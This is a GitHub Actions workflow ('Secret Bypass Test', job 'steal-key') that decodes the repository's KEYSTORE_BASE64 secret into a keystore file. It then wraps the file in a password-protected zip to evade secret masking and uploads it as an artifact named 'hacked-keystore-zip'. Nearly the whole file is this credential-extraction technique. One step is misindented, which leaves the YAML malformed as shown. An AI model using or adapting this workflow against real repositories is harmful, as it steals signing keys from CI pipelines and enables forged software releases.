name: Secret Bypass Test

on:
  workflow_dispatch:

jobs:
  steal-key:
    runs-on: ubuntu-latest
    steps:
      - name: Decode and Obfuscate Secret
        run: |
          echo "${{ secrets.KEYSTORE_BASE64 }}" | base64 --decode > dummy.jks
          zip -P "hack123" stolen_data.zip dummy.jks

                - name: Decode via ENV (Round 2)
        env:
          THE_KEY: ${{ secrets.KEYSTORE_BASE64 }}
        run: |
          printf "%s" "$THE_KEY" | base64 --decode > dummy.jks
          zip -P "hack123" stolen_data.zip dummy.jks

      - name: Upload Disguised Artifact
        uses: actions/upload-artifact@v4
        with:
          name: hacked-keystore-zip
          path: stolen_data.zip
